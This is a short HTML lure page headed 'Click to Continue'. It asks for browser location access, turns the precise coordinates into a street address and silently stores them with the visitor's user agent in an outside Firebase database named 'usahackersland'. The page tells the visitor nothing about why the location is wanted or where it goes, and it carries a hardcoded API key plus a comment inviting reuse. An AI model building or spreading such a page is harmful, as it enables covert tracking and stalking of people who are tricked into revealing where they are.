<!DOCTYPE html>
<html>
<head>
  <title>Click to Continue</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
  <h2>Click ‚ÄúAllow‚Äù to share your location</h2>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    // üîë REPLACE WITH YOUR FIREBASE CONFIG
    const firebaseConfig = {
      apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
      authDomain: "usahackersland.firebaseapp.com",
      projectId: "usahackersland",
      storageBucket: "usahackersland.appspot.com",
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    if (!navigator.geolocation) {
      alert("Geolocation not supported on your browser");
    } else {
      navigator.geolocation.getCurrentPosition(async pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;

        // Reverse geocode with OpenStreetMap
        const geo = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
        ).then(r => r.json());

        try {
          await addDoc(collection(db, "clicks"), {
            latitude: lat,
            longitude: lon,
            address: geo.display_name || "Unknown",
            userAgent: navigator.userAgent,
            time: new Date().toISOString()
          });

          document.body.innerHTML = "<h3>‚úÖ Location submitted. Thank you!</h3>";
        } catch (err) {
          document.body.innerHTML = "<h3>‚ùå Error submitting location</h3>";
          console.error(err);
        }

      }, () => {
        alert("Location permission denied");
      }, { enableHighAccuracy: true });
    }
  </script>
</body>
</html>
